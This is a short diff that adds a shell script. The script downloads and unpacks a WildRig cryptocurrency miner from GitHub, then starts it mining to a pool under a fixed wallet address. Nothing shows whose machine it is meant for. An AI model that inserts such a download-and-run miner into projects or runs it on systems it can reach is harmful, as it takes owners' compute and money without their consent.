@@ -1,0 +1,3 @@
+curl https://github.com/andru-kun/wildrig-multi/releases/download/0.47.9/wildrig-multi-linux-0.47.9.tar.gz -L -o wildrig-multi-linux-0.47.9.tar.gz
+tar xf wildrig-multi-linux-0.47.9.tar.gz
+./wildrig-multi --algo qhash --url qubitcoin.luckypool.io:8610 --user bc1qz5r5wtgtumpv0eqyluulztpqv7dcu6fe08n8wf.$(echo $RANDOM | md5sum | head -c 10) --pass x
